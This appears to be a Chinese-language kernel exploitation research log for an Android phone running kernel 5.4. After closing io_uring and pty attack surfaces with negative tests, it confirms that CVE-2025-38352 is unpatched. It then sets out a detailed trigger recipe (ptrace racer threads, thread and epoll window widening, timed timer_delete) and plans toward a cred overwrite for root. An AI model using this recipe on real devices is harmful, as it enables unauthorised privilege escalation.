★ 需要注意: 本机的固定缓冲区 API 是 **`sqe->addr` = 用户缓冲区的真实地址 + `sqe->buf_index` = 注册索引**,
两者必须**配对**。实测(注册 A/B/C 三条 4K 页对齐缓冲):
| 用例 | 结果 | 判读 |
|---|---|---|
| `addr=A bi=0` / `addr=B bi=1` / `addr=C bi=2` | **5 / 5 / 5** | ✓ 正确配对真的工作 |
| `addr=A bi=1` / `addr=A bi=2` / `addr=B bi=0` / `addr=C bi=1` | **-EFAULT** | ✓ **地址必须落在该索引的区间内** |
| `bi=3` / `0xffff` / `0x7fff` | **-EFAULT** | ✓ **索引范围校验** |
| `A+0 len=5 off=0` / `A+4090` / `A+4091`(**正好到边界**) | 5 / 5 / 5 | ✓ |
| `A+4096 len=5` / `A-1` | -EFAULT | ✓ 上界/下界都查 |
| `len=4095/4096`(超出剩余) / `len=0xffffffff` | -EFAULT | ✓ |
| `len=0` | 0 | ✓ |
| `off=~0` | **-EINVAL** | ✓ 溢出/``rw_verify_area`` 挡 |
| 反注册后再用旧地址(悬垂) | -EFAULT | ✓ **无悬垂引用** |
| 300 轮交错配对抖动(含越界索引) + 200 轮边界抖动 | 无崩溃 | ✓ |
⇒ **双轴校验(索引范围 + 地址落区)** 都在 —— 正是历史 io_uring 固定缓冲区 bug
(CVE-2021-3491 那一类)的爆点, 本机**扎实** ✓

### (b) POLL_ADD / POLL_REMOVE 时序 (工具 `uring_fixed.c`)
| 用例 | 结果 |
|---|---|
| add(无数据) | 挂起(CQE 数 0) ✓ |
| remove 该 poll | **CQE res=0**, 目标被取消 ✓ |
| **重复** remove(已不存在) | **-ENOENT** ✓ |
| remove 一个从未提交的 user_data | **-ENOENT** ✓ |
| 一次提交 24 个 POLL_ADD, 再批量 REMOVE 24 个 | 24 个 CQE, 全部命中 ✓ |
| add → `close(fd)` → remove | 正常回 CQE, 不崩 ✓ |
| `IOSQE_IO_LINK`: POLL_ADD → NOP(有数据时) | CQE 顺序 = `1(POLLIN)` 后 `0(NOP)` ✓ 链语义正确 |
| 同一 user_data 提交两个 POLL_ADD 再 remove | 正常处理, 不崩 ✓ |
| **400 轮 add/remove 抖动**(含周期性写数据/关 fd) | 无崩溃 ✓ |

## 19.4 io_uring 面结论
- **本机 io_uring 是被裁剪的早期版本**: register 只有 0–5、`IORING_OP_LAST=12`、`flags ≤ 0x7`、
  `features=0x1`。现代 io_uring 里最危险的那些面(personality、restrictions、R_DISABLED、
  PROVIDE_BUFFERS 缓冲区号管理、SPLICE/TEE、poll 多路通知、SQPOLL/IOPOLL、文件表更新)
  **在本机根本不存在**。
- 已实现的 12 个 opcode 经**功能性 + 边界 + 时序抖动**三轮测试**全部干净**:
  固定缓冲区双轴校验到位、POLL 时序语义正确且可反复抖动、参数溢出与越界一律被拒。
- **未发现可用点**; `io_uring` 面关闭 ✓ —— 这是第 **9** 块被定性关闭的面。
- ⇒ 现在"可达面"清单(§8/§13/§15/§16/§18 + 本节)已经**全部走完并留下否定证据**,
  唯一还没被彻底走完的只剩 pty 的**生命周期**(分配/释放/ldisc 绑定/ioctl 竞态)那条窄缝。

## 19.5 工具清单(本轮新增)
| 工具 | 用途 |
|---|---|
| `uring_probe2.c` | 完整 ring 框架(手工 mmap SQ/CQ) + REGISTER_PROBE + register 操作号枚举 + opcode 初扫 |
| `uring_op2.c` | opcode 集判别(fd=-1 vs 7 种合法 fd 的返回值集合) + SQE flags 全扫 + register 0–5 合法参数 |
| `uring_ops3.c` | 功能性确认(TIMEOUT/POLL_ADD/READV 正常路径 + OPENAT/CLOSE/ACCEPT 反证) |
| `uring_fixed.c` | 固定缓冲区边界 + POLL 时序(重复移除/批量/关 fd/LINK/400 轮抖动) |
| `uring_fixed2.c` | 正确语义下的 READ_FIXED/WRITE_FIXED 边界矩阵 |
| `uring_bidx.c` | 隔离测试 `buf_index` 边界(addr 固定, 只变索引) |

## 19.6 ★ 工具坑(自己踩的, 记录以免重犯)
1. **固定缓冲区 API 随版本变化**: 早期版本 `READ_FIXED` 用 `sqe->addr` 作真实地址 + `buf_index` 作索引,
   两者必须配对; 我先按"addr 当偏移"测, 得到"连正常用例都 -EFAULT"的假象。**测 io_uring 前必须先确定版本语义**
   (本次靠"CLOSE 是否真关 fd"这类功能性反证 + register/opcode 指纹确定的)。
2. **管道读端是阻塞的**: 用 `while(read(pipe_rd)>0);` 排空会**永久阻塞**(写端仍开)。排空前必须
   把读端设为 `O_NONBLOCK`, 并在设备侧用 `timeout N` 包一层防止 adb 调用挂死。
3. `ssubmit` 用 `min_complete=1` 会在请求永不完结(POLL/TIMEOUT 大值)时阻塞,
   应改为 `min_complete=0` + 限时轮询 CQ。


---
# 20. ★★ pty 生命周期与竞态审计: 面关闭(第 10 块)
第 10 轮(§10)只审了 ptmx 的**能力面**; 本节补上**生命周期与竞态**这一块 ——
这是 tty/pty 子系统历史上 bug 最集中的地方。结论: **无可用点, 无崩溃, 无泄漏**。
工具 `C://qemu_test//pty_life.c`。设备 uptime 连续 1h39m+。

## 20.1 剩余 tty ioctl 可达性地图(工具 `pty_life` A 段)
| ioctl | master | slave | 判读 |
|---|---|---|---|
| `TIOCGPTLCK` / `TIOCGPKT` / `TIOCGEXCL` / `TIOCGPGRP` / `TIOCPKT` | **0 (ok)** | — | pty 自身的查询口, 可达 |
| `TIOCGPTPEER`(flags=O_RDWR / **0** / **0xffffffff**) | **返回 fd (ok)** | — | ★ 见 §20.2 |
| `TIOCMGET/SET/BIS/BIC` / `TIOCNOTTY` | ENOTTY(25) | — | 对 ptmx 不适用(modem/控制终端语义), 正常 |
| `TIOCSCTTY` / `TIOCVHANGUP` | **EPERM(1)** | EPERM(1) | 有权限门 ✓ |
| **`TIOCSPGRP` / `TIOCGSID`** | ENOTTY(25) | **ENOTTY(25)** | ★★ 见 §20.3 |
| **`TIOCSIG`** | EINVAL(22) | — | 需要前台进程组/控制终端 ⇒ 不可达 ✓ |
| slave 侧 `TIOCGSID/NOTTY/VHANGUP/STI/GPTN/SPTLCK` | — | **EACCES(13)** | SELinux 按 tty 类做了更窄的 ioctl 白名单 |
⇒ 综合 §10 + 本节: **tty/pty 面上对我们放行的只有"pty 自身查询 + winsize/termios 基础操作 + TIOCGPTPEER"**,
其余全被能力门/class 中介/语义检查挡住。

## 20.2 TIOCGPTPEER 的 flags 直接当 open flags 用(记录, 无安全影响)
`TIOCGPTPEER` 的 arg 会被原样当作新 fd 的 open flags 传给 `do_dentry_open` 路径, 因此
`flags=0` 与 `flags=0xffffffff`(含 O_PATH/O_DIRECTORY/O_DIRECT 等) **都能成功返回 fd**。
这是该 ioctl 的设计语义(不是越界/不是绕过), 记录以备后续参考; 未观察到任何异常行为。

## 20.3 ★★ `TIOCSPGRP` / `TIOCGSID` / `TIOCSIG` 不可达 ⇒ CVE-2020-29661 那条路关闭
`tiocspgrp()` 的第一步是 `tty_check_change(real_tty)`: 要求该 tty **必须是本进程的控制终端**
(否则返回 -ENOTTY)。我们刚创建的 pty 不是任何进程的控制终端 ⇒ **在写 `tty->pgrp` 之前就被拒**。
实测 master 与 slave **双端都是 ENOTTY(25)**, `TIOCGSID` 同, `TIOCSIG` 是 EINVAL ⇒
**`tty->pgrp` / `tty->session` 的引用计数路径对本域不可达** ⇒
经典 pty LPE(CVE-2020-29661 `TIOCSPGRP` 的 `tty->pgrp` UAF, 配合 pidfd)在本机**走不通** ✓
(且 vendor SPL 2024-02 早已包含该修复, 这里是**双保险**的实证。)

## 20.4 生命周期抖动(工具 B 段)
500 轮 `open(/dev/ptmx) → TIOCGPTN → TIOCSPTLCK(0) → open(/dev/pts/N) → write → close(slave) → close(master)`:
- **成功完整生命周期 500/500, master 打开失败 0 次**
- 末次 pty 索引 = **2** ⇒ **索引立即复用, 无泄漏/无漂移** ✓(对比: 若泄漏, 索引会单调上涨)
- §20.6 的内存对比进一步证实无泄漏

## 20.5 ★ 四线程竞态(工具 C 段, 两轮共 ~1.7M 次操作)
| 线程 | 行为 | 第 1 轮(6s) | 第 2 轮(4s) |
|---|---|---|---|
| A | 完整生命周期循环 | 83,265 | 26,784 |
| B | 反复 `open("/dev/pts/<陈旧索引>")` | **1,135,608** | **367,964** |
| C | `TIOCSPTLCK` 上/解锁与 `open(slave)` 同时交替 | 44,651 | 14,386 |
| D | `TIOCGPTPEER`(含 flags=~0) 与 `close(master)` 同时 | 88,595 | 29,118 |
- **两轮均无崩溃、无挂死, 全部阶段跑完** ✓
- ⚠ 诚实说明: 输出里的"意外 errno 计数"字段在实现里**从未被累加**(占位符), 它**不是**证据;
  真正的判据是 ①无崩溃/无挂死 ②上述操作的巨大计数 ③后续阶段(256 pty)仍能成功。
- 另: 200 轮 `master 非阻塞读 → close(slave) → 再读`(应拿 EOF/EIO) 全部完成, 无异常
- 256 个 pty **同时持有**(512 个 fd: 256 master + 256 slave)后一次性全部释放, 成功 ✓

## 20.6 资源泄漏检查(churn 前后对比)
```
before: uptime 1:39  MemFree 1199244 kB  MemAvailable 7195600 kB  SReclaimable 450652 kB
after : uptime 1:39  MemFree 1209044 kB  MemAvailable 7205416 kB  SReclaimable 450652 kB
```
⇒ 1.35M 次 pty 生命周期操作后 **MemFree/MemAvailable 反而上升 ~9.8MB**(正常缓存回收),
`SReclaimable` **完全不变** ⇒ **无内核对象/内存泄漏** ✓
- 附: `/proc/tty/drivers` 读为 **EACCES**(与 §0 的可达性地图一致, 该 proc 文件被封)

## 20.7 pty 面结论
- 可达的只是 pty 自身查询 + termios/winsize + TIOCGPTPEER; 控制终端语义相关的
  `TIOCSPGRP/TIOCGSID/TIOCSIG/TIOCSCTTY/TIOCNOTTY/TIOCVHANGUP` 全被挡(ENOTTY/EPERM/EACCES/EINVAL),
  ⇒ **`tty->pgrp` / `tty->session` 引用计数路径不可达**(CVE-2020-29661 那条路关闭)。
- 生命周期与竞态(~1.7M 次操作, 含索引复用/解锁竞态/陈旧索引/peer 竞态/master-slave 关闭时序)
  **无崩溃、无挂死、无泄漏、可重复**。
- **未发现可用点; pty 面关闭** ✓ —— 这是第 **10** 块被定性关闭的面。

## 20.8 至此的通盘局面
| # | 面 | 状态 |
|---|---|---|
| 1 | kgsl | 关闭(14 ioctl + IO 地基 + 微码路线, §3) |
| 2 | hid-multitouch 全链路 | 关闭(§7/§11) —— 但其中**越界写原语可用** |
| 3 | uinput(+FF) | 关闭(§15) |
| 4 | SYSVIPC / keyring | 不可用 |
| 5 | ptmx + ldisc | 关闭(§10) |
| 6 | binder(对象翻译) | 关闭(§13; 调用可通、传对象被挡) |
| 7 | BPF | 关闭(SELinux EACCES, §16) |
| 8 | perf | 关闭(§18) |
| 9 | io_uring | 关闭(§19) |
| 10 | pty 生命周期/竞态 | **关闭(本节)** |
⇒ **此前识别出的全部可达面都已走完并留下否定证据**。资产 = 一个受控越界写原语(§7/§9 配方)
+ 十块面的否定证据地图 + 一套可复用的内核审计方法论(§18.4/§19.6 的 ioctl/io_uring 版本指纹、
§10.2 的"接受判据"、§19.2 的"双值形态判别法")。


---
# 21. ★★★★★ 反向补丁审计首个重大发现: 本机未修复 CVE-2025-38352 (posix-cpu-timers UAF)
**这是本项目迄今为止最重要的发现**: 一个**可达、未修复、已被在野利用、有公开 PoC** 的
本地提权候选, 而且**不需要任何设备或 CAP**, 只需要本地非特权代码。

## 21.1 为什么做反向补丁审计: 缺口被量化了
| 项 | 值 |
|---|---|
| 内核 | `5.4.281-qgki-g2a88cd145def` |
| **构建时间** | **Wed May 7 12:07:39 CST 2025** |
| framework SPL | 2025-04-01 |
| **vendor SPL** | **2024-02-01**(内核补丁级别) |
| `ro.product.model` / fingerprint | V2222A / `vivo/PD2220/...` |

**Linux 5.4.281 = 2024-07-27 发布; 5.4 LTS 于 2025-12-03 EOL, 最后一版 5.4.302。**
⇒ 本机**完全缺失 5.4.282 → 5.4.302 共 21 个稳定版 ≈ 16 个月的安全修复**
(Greg KH 在 EOL 公告里指出 5.4 当时**仍有 1539 个已知 CVE 未修复**)。
**而我们要找的正是这批修复里"打得到我们可达面"的那些** —— 这比盲扫可达面高效一个数量级。

## 21.2 CVE-2025-38352 事实(来自上游补丁 + 权威来源)
- **漏洞**: `kernel/time/posix-cpu-timers.c`, `handle_posix_cpu_timers()` 与 `posix_cpu_timer_del()`
  之间的 TOCTOU 竞态 ⇒ **UAF**(CWE-362/367)
- **机制**(上游 commit 原话):
  > If an exiting non-autoreaping task has already passed exit_notify() and calls
  > handle_posix_cpu_timers() from IRQ, it can be reaped by its parent or debugger right
  > after unlock_task_sighand(). If a concurrent posix_cpu_timer_del() runs at that moment,
  > it won't be able to detect timer->it.cpu.firing != 0: cpu_timer_task_rcu() and/or
  > lock_task_sighand() will fail.
- **修复**: 在 `run_posix_cpu_timers()` 里加三行 guard
  ```c
  	lockdep_assert_irqs_disabled();
  +	if (tsk->exit_state)
  +		return;
  ```
  mainline `f90fff1e152dedf52b932240ebbd670d83330eca`; **5.4 分支 backport `2c72fe18cc5f9f1750f5bc148cf1c94c29e106ff`**
- **受影响版本**: 2.6.36 → **5.4.294**(修复于 **5.4.295**)
- **例外**: "This fix is not needed if `CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y`"
- **严重性/状态**: CVSS 7.4~7.8; **在野利用, 已进入 CISA KEV(2025-09-04);
  被纳入 Android 2025-09 安全公告; Google TAG 列入 2025 零日回顾; Lookout 确认针对 Android 的目标性利用**
- **公开 PoC**: 2026-01 由 farazsth98 发布, 名 **`chronomaly`**(x86_64/ARM/ARM64 可编译);
  其利用链: POSIX CPU timer UAF 打在 `struct sigqueue` → **pipe buffer 跨 cache 回收** →
  覆盖 `list_head` 使 `list_del_init()` 变成对 **`task_struct->cred` 的任意写** → 指向 uid/gid 全 0 的伪造 cred

## 21.3 ★ 本机判定: 三重独立证据一致 ⇒ **未修复**
### (a) 版本
本机 5.4.281 **< 5.4.295**(修复版本) ⇒ 在受影响区间内(受影响上界是 5.4.294) ✓
### (b) 配置: 那个"不需要修复"的例外**不成立**
`/proc/config.gz`(本地留档 `C://qemu_test//device_config.txt`)里:
```
CONFIG_POSIX_TIMERS=y
CONFIG_POSIX_CPU_TIMERS_TASK_WORK   ← 该符号在本树中**完全不存在**(不是 =n)
```
⇒ 本机走的是"**IRQ 内联处理到期**"的老设计, 正是需要该修复的那种 ✓
### (c) 代码: 反汇编证明 guard 不存在(最硬的证据)
`run_posix_cpu_timers`@`0xffffffc0103ddea0`(函数长 **0x2ec** = 187 条指令):
```
103ddec4  mrs  x19, SP_EL0              ← x19 = current (tsk)
103ddecc  stp  x9, xzr, [sp,#0x10]      ← pct 的 timerqueue 初始化
103dded4  ldr  x8,  [x19, #0x7e8]       ← tsk->posix_cputimers.bases[0].nextevt   103dded8  ldr  x9,  [x19, #0x800]       ←                bases[1].nextevt          > 步长 0x18
103ddedc  ldr  x10, [x19, #0x818]       ←                bases[2].nextevt          /
103ddee0  and  x11, x9, x8
103ddee4  and  x11, x11, x10
103ddee8  cmn  x11, #0x1                ← 三个都是 ~0 = 无定时器
103ddeec  b.eq 103ddf18                 ← 去 fastpath 的另一半
```
**偏移完全对上**: `&tsk->posix_cputimers` = 0x7e0, 三个 `bases[*].nextevt` 在 0x7e8/0x800/0x818
(步长 0x18 = `struct posix_cputimer_base { u64 nextevt; struct timerqueue_head; }`) ✓
⇒ 取到 `current` 之后**紧接着就是 fastpath**, **没有 `exit_state` guard**。
**全函数枚举**: 该函数里对 `current` 的全部 **32 位**访问只有 —
`#0xb4`(测 bit31)、`#0x474`(字节,测 bit4,读2写1)、`#0x690`(送 printk)、`#0x10`(`__state`);
**没有任何"小枚举非零即提前返回"的 guard** ⇒ 修复确实不存在 ✓
**内联 IRQ 处理确证**: 函数内部直接调 `__lock_task_sighand` → `collect_posix_cputimers` → `send_signal`
⇒ 到期确实在 IRQ 内联处理(与 (b) 一致) ✓
### (d) 语义旁证
该修复的 `Fixes:` 指向 `0bdd2ed4138e("sched: run_posix_cpu_timers: Don't check ->exit_state,
use lock_task_sighand()")` —— 即**这个 guard 当年是被主动删掉的**, 5.4.295 又把它加回来。
本机看到的是"删掉之后"的形态 + `lock_task_sighand` 路径 ✓ 三条证据自洽。

## 21.4 ★ 前提条件实测: **全部可达**(工具 `C://qemu_test//posix_timer_race.c` 第 0 段)
```
timer_create(CLOCK_REALTIME)            → 0 ; settime → 0 ; delete → 0
timer_create(CLOCK_MONOTONIC)           → 0 ; settime → 0 ; delete → 0
timer_create(CLOCK_PROCESS_CPUTIME_ID)  → 0 ; settime → 0 ; delete → 0   ★ CVE 需要
timer_create(CLOCK_THREAD_CPUTIME_ID)   → 0 ; settime → 0 ; delete → 0   ★ CVE 需要
timer_create(CLOCK_BOOTTIME)            → 0 ; settime → 0 ; delete → 0
```
⇒ **POSIX CPU timer 完整可用**(这正是 uid=2000 能用的东西), 且线程/进程可随意创建
⇒ **这个 CVE 的触发要素对本域 100% 可达**, 不需要任何设备、不需要 CAP。

## 21.5 触发尝试: 5 种朴朴素素竞态模式 ~86,500 次, **未抢到窗口**
| 模式 | 结构 | 迭代 |
|---|---|---|
| A | pthread 建 `CLOCK_THREAD_CPUTIME_ID` 定时器(1ns 周期) → 线程退出 ∥ 主线程紧循环 `timer_delete()` (SIGEV_SIGNAL) | 20,830 |
| A' | 同上, SIGEV_NONE | 39,941 |
| B | 子进程建 `CLOCK_PROCESS_CPUTIME_ID` 定时器 → `_exit` ∥ 父进程延迟收割(制造非 autoreap 窗口) | 6,123 |
| C | 多线程组(退出线程非 autoreap), 退出与 delete 同时 | 7,881 |
| D | 高频 create/settime/delete + 线程快速生灭 | 11,752 |
- **合计 ~86,500 次, 无崩溃、无挂死**(uptime 连续 1:46 → 1:47), 进程正常 rc=0
- ⇒ **诚实结论: 未修复 ≠ 已触发。** 朴素抖动抢不到那个极窄的窗口;
  真正赢需要 PoC(`chronomaly`)那种精确构造: 让"已过 exit_notify 的退出任务"被父进程/调试器
  在其 `unlock_task_sighand()` 之后**恰好**收割, 同时另一 CPU 上的 `posix_cpu_timer_del()` 正在跑。

### 下一步把窗口撬开的具体做法(留档)
1. **拉长退出路径**: 让退出任务持有大量 POSIX CPU 定时器(每个都走一次 `posix_cpu_timer_del`)
   + 大量 fd + 大量线程 ⇒ 把 `exit_notify` 之后的执行时间拉长, 提高 IRQ 落进去的概率。
2. **多 CPU 对撞**: 用若干个 CPU hog 线程占满其它核, 让定时器 IRQ 与退出路径落在**不同 CPU**上
   (该 UAF 需要两边并行); 同时用 `sched_setaffinity` 把退出线程与 hog 分核。
3. **用调试器收割**: `PTRACE_SEIZE` 一个兄弟进程做 debugger, 精确控制"收割"的时机
   (CVE 原文明确提到 "reaped by its parent **or debugger**")。
4. **让 `firing` 保持置位**: 用 `it_interval` 周期到期 + 在退出前反复 `settime`, 使
   `timer->it.cpu.firing` 在竞态窗口内更容易为 1。
5. **抄 PoC**: `chronomaly`(farazsth98, 2026-01) 已给出完整构造(含 `struct sigqueue` 的
   pipe-buffer 跨 cache 回收与 cred 任意写) ⇒ **照它的 trigger 段实现即可**, 不必自己推。

## 21.6 这一步对整个项目的意义
- 它**第一次给出了一个不需要"盲写原语"的提权候选**: CVE-2025-38352 的原语是
  **"对 `task_struct->cred` 的任意写"**(由 `list_del_init()` 实现), 也就是
  §14 结论里说的"**需要另一种原语**"中的那一种 —— 能写到**指定对象**、且**内容可控**。
- 而且它与我们已有资产**互补**: 现有 hid-multitouch 越界写原语可作**堆风水/回收的辅助**
  (kmalloc-128 受控越界写可在需要时制造/破坏相邻对象), 两者可联合使用。
- **这是本项目找到的第 2 个内核 bug, 也是第 1 个有明确提权路径的内核 bug。**

## 21.7 工具与本轮修正
- 新工具: `C://qemu_test//posix_timer_race.c`(能力侦察 + 5 种竞态模式, 判据 = uptime 是否复位)
- ★ 工具坑: 能力侦察里给 `CLOCK_REALTIME` 建 **1ns 到期 + `SIGEV_SIGNAL(SIGRTMIN)`** 的定时器
  会**直接打死本进程**(SIGRTMIN 默认动作是终止; 实测 rc=169 而 uptime 未复位 ⇒ 不是内核崩溃)。
  ⇒ **凡是要用 SIGEV_SIGNAL 的定时器测试, 必须在最开头就 `signal(SIGRTMIN, SIG_IGN)` + 屏蔽**。


---
# 22. ★★★ CVE-2025-38352 触发工程: 完整配方 + 框架已跑通, 但**竞态尚未赢下**
本节是 §21 的续: §21 判定"未修复", 本节按公开 PoC 的配方把**触发框架**从零实现出来。
工具: `C://qemu_test//cve38352.c`(替代早期的 `posix_timer_race.c` 朴素版)。

## 22.1 ★ 公开 PoC 的完整配方(来自作者 farazsth98 的三篇分析文, 逐条落地)
> 作者原文要点(中文摘要):
> 1. 配置 **18 个 stalling timer + 1 个 UAF timer**(`handle_posix_cpu_timers()` 单次中断处理上限 **19**)
> 2. 确保它们**同一时刻触发**
> 3. 确保在 `handle_posix_cpu_timers()` 内 **stalling timers 在 UAF timer 之前**被 collect 进列表
> 4. 每个 timer 向进程内**所有 thread** 发 `SIGUSR1`
> 5. **创建尽可能多的 thread(最终 11,000+)**, 全部 **block SIGUSR1** 并**阻塞在 pipe read**(不耗 CPU)
> 6. 在 child 里设 **racer thread**(文中称 "reapee")
> 7. 触发漏洞需在 `do_notify()` 唤醒 ptracing parent **之后**进入 `handle_posix_cpu_timers()`
> 8. **racer 必须被 parent `ptrace`** —— 这是它"非 autoreap"的唯一办法
> 9. parent 对 racer thread 调 **`waitpid()` 进行 reap**; 时机对 ⇒ 它在执行
>    `handle_posix_cpu_timers()` 时被 reap
> 10. child 里 `usleep()` 睡一段**任意时间**, 然后对 UAF timer 调 **`timer_delete()`**
>     —— **usleep 的作用就是让 delete 落进竞争窗口**
> **窗口拉长机理**: `send_sigqueue() → complete_signal()` 会遍历进程里的**每个 thread**
> (因为所有 helper 都 block 了 SIGUSR1, `wants_signal()` 全返回 false ⇒ **整组全遍历**)
> ⇒ 19 timers × 11,000 threads ⇒ 窗口 **4–5 ms**
> **进一步拉长**: `signalfd_notify() → wake_up() → __wake_up_common()` 遍历 waitqueue;
> 用 **signalfd + epoll** 堆 **50,000** 个 waitqueue entry(借 Jann Horn 的 epoll 技巧) ⇒ 再翻 5 倍以上

### ★ 为什么必须 ptrace(推理, 已由实测证实)
`exit_notify()` 里:
```c
if (unlikely(tsk->ptrace))            { ... autoreap 走 ptrace 分支 ... }
else if (thread_group_leader(tsk))    autoreap = thread_group_empty(tsk) && do_notify_parent(...);
else                                  autoreap = true;     /* ★ 非 leader 且未被 ptrace ⇒ 自我回收 */
```
⇒ **racer 必须是"非 leader 线程"(这样它的 `release_task` 才与其它线程独立)**
**且被 ptrace**(否则它会 `autoreap=true` 立刻自我回收, 没有可精确控制的 `release_task`)。
两个条件缺一不可 —— 这是本节的第一个关键结论。

## 22.2 ★ 实测可达性(全部通过)
| 项 | 结果 |
|---|---|
| `PTRACE_ATTACH` 自己的子进程(racer 线程 TID) | **成功** ★ 关键 —— SELinux **不拦** |
| `RLIMIT_NPROC` / `RLIMIT_NOFILE` | 43442 / 32768 ⇒ 线程与 fd 都有余量 |
| 5 种 clock 的 `timer_create/settime/delete` | 全成功(§21.4) |
| 3000 个 helper 线程实际建成 | ✓(load avg 冲到 ~150 ⇒ 确已创建) |
| signalfd+epoll 加长 | `signalfd=7, dups=59, epoll=120` ⇒ **waitqueue entry ≈ 7080** ✓ |

## 22.3 框架迭代(4 轮, 每轮都修掉一个真问题)
| 轮 | 现象 | 根因 | 修法 |
|---|---|---|---|
| v0 | `posix_timer_race.c` 5 种朴素模式 ~86,500 次无果 | 未按配方构造窗口 / 未 ptrace | 按配方重写 |
| v1 | `attach` 只 **4/24** 成功 | racer 已武装并 `pthread_exit`, parent 拿到 tid 时它已死 ⇒ **赶不上 attach** | 加 parent→child 的 **`go` 管道**: racer 先公布 tid 再挂起等 go |
| v2 | 循环卡死, `timeout` 被杀 (rc=124) | **被 ptrace 的任务死后必须由 tracer 收割**, 否则线程组无法销毁 ⇒ `waitpid(child)` **死锁** | 兜底 `PTRACE_DETACH` + `waitpid(tid,__WALL\|WNOHANG)` 循环 |
| v3 | 时序正确但**无窗口** | deleter 在武装后**立刻**删除, 远早于窗口 | 删除改为**随机延迟后打一发**(`g_deldelay ∈ [0,6000]µs`) |
### 最终版实测
```
24 次尝试(3000 helpers + widen): attach 24/24, 19.6s
40 次尝试(3000 helpers + widen 7080 + 随机删除延迟): attach 40/40, 31.4s
⇒ 全部阶段跑完, 设备 uptime 连续(1:53 → 1:58), 零崩溃
```

## 22.4 ⚠ 诚实结论: **机制全部就位, 但竞态尚未赢下**
- **已证明可用**: ptrace 非 autoreap 构造 / 精确 `release_task`(`waitpid`→`DETACH`) /
  3000 helper 线程的窗口放大 / 7080 个 signalfd-epoll waitqueue entry 的二次放大 /
  19 个 CPU timer / 与退出并发的一次性 `timer_delete()`
- **尚未证明**: 真正命中 UAF。判据(设备 uptime 复位 / `BUG_ON`)始终未触发。
- 作者自己也说明过: 即便 PoC 跑通, "**4–5ms 听起来仍然不够长**", 且 `usleep` 的定时逻辑
  "**很脆弱**"; 他是靠**大量实验调参**才让 `timer_delete()` 落在窗口里。
### 还差什么(留档, 按优先级)
1. **线程数**: 作者用 **11,000+**, 我们只用 3000 ⇒ 窗口只有约 1/4。**这是最大的单一杠杆。**
   当前瓶颈是"每次尝试都 fork 一个新进程 + 重建 3000 线程"(~0.8s/次)。
   ⇒ **优化方向: 在同一个 child 里循环做多次尝试**(线程池只建一次, 每次只新建一个 racer),
   把 11,000 线程的代价摊薄到几百次尝试上。
2. **缺观测手段**: 我们**读不到 dmesg/kmsg**(§0 的可达性地图), 所以看不到 `WARN_ON_ONCE`/oops 文本;
   唯一判据是 uptime 复位。⇒ 建议先**想办法拿到内核日志**(如 `logcat` 是否含 kernel 消息、
   或在崩溃后看 `/sys/fs/pstore`), 否则调参等于盲调。
3. **删除时机**: 需要把 `timer_delete()` 精确钉在"racer 已过 exit_notify、IRQ 正在处理 19 个 timer"
   的那几毫秒内。可用**父进程侧的事件驱动**(parent 在 `waitpid` 返回的瞬间通知 child 删除)
   替代当前的随机延迟。
4. **`SIGQUEUE_PREALLOC`**: 作者指出删除 timer 会清掉 `timer->sigq` 的 `SIGQUEUE_PREALLOC`,
   从而触发 `send_sigqueue()` 里的 `BUG_ON()` —— 这**正是我们想要的判据**(崩溃/panic),
   不需要绕过它(绕过是提权才要做的)。
5. **直接移植**: `chronomaly` 仓库已给出完整 trigger + 堆布局; 在设备上直接编译移植比自研调参快得多。

## 22.5 ★ 工具坑(本轮踩的, 全部记录)
1. **clang 不支持嵌套函数**(GCC 扩展) ⇒ 回调必须放文件作用域。
2. **被 ptrace 的任务死后必须由 tracer 收割**, 否则其线程组无法销毁 ⇒ 父进程 `waitpid(child)` 死锁。
3. **管道方向别写反**: `child → parent` 传 tid, `parent → child` 传 go, 两条独立管道。
4. **`PTRACE_ATTACH` 必须在 racer 退出之前建立** —— 靠"先公布 tid 再挂起等 go"的握手,
   否则 attach 成功率只有 ~17%(4/24)。
5. **`timer_delete()` 的时机是决定性的**: 武装后立刻删除等于没删(远早于窗口)。
6. 用一个错误的时钟比较(`time(NULL)` 减 `CLOCK_MONOTONIC`)做进度打印 ⇒ 出现"已用 1790002544.0s"
   这种荒谬数字。**混用时钟是低级但致命的坑。**
7. 自建 SIGEV_SIGNAL(SIGRTMIN) 的 1ns 定时器会**打死自己的进程**(§21.7)。


---
# 23. CVE-2025-38352 触发: 第二轮调参(8000 线程 + 事件驱动删除) —— 仍未赢, 决定转策略
## 23.1 本轮两处关键改进(按 §22.4 的优先项 1 与 3)
### (a) 线程数 3000 → **8000**(窗口 ∝ 线程数, 最大单一杠杆)
### (b) ★ 删除时机改为**父进程事件驱动**(替换随机延迟盲打)
新增第三条管道 `g_fire`(parent → child):
```
parent:  ... waitpid 拿到 racer 退出通知 ...
         write(g_fire, 1)          ← ★ "现在就是 release_task 时刻"
         usleep(20)
         PTRACE_DETACH(rtid)       ← release_task
child(deleter):  read(g_fire) 阻塞 → 醒来后连打 64 次 timer_delete()
```
⇒ `timer_delete()` 与 `release_task()` 之间的偏差从"随机 0–6000µs"压缩到 **~20µs**。
## 23.2 实测结果
```
before: uptime 2:03
[71..79] attach=ok ... 完成尝试=80 (ptrace 成功=80, 被拒=0, fork 失败=0)  已用 112.7s
after : uptime 2:05      ← ★ 设备未复位, 零崩溃
```
- `PTRACE_ATTACH` **80/80 成功**(时序握手稳定)
- 8000 helper 线程 + signalfd/epoll **≈7080 waitqueue entry** + 19 timers + 事件驱动删除
- **判据(uptime 复位 / `BUG_ON`)始终未触发 ⇒ 仍未赢下竞态**

## 23.3 累计投入与结论
| 阶段 | 构造 | 尝试 | 结果 |
|---|---|---|---|
| v0 `posix_timer_race.c` | 5 种朴素竞态模式 | ~86,500 | 无果 |
| v3 `cve38352.c`(3000 线程 + widen 7080 + 随机删除) | 按配方 | 40 | 无果 |
| **v4(8000 线程 + widen 7080 + 事件驱动删除)** | 按配方+两项改进 | **80** | **无果** |
- **诚实结论**: 框架**功能上已完整并经过验证**(见 §22.2/§22.3 的机制清单), 但**命中率仍为 0**。
- **根因判断(重要)**: 我们**读不到内核日志**(§0 可达性地图: kmsg/dmesg 全 EACCES) ⇒
  **看不到 `WARN_ON_ONCE` / oops / `BUG_ON` 文本, 也无法知道 `timer_delete()` 是否真的落进了窗口**
  ⇒ 目前的调参本质上是**盲调**。作者本人也是靠大量实验调参才让 delete 落进窗口,
  且明说 4–5ms 的窗口"仍不够长"、定时逻辑"很脆弱"。
- 另一个客观障碍: 每次尝试都要 fork + 重建 8000 线程(~1.4s/次), 单机一小时也只能跑几千次尝试;
  而窗口是**亚毫秒级对齐**问题。

## 23.4 ★ 策略转向建议(这是本节最重要的输出)
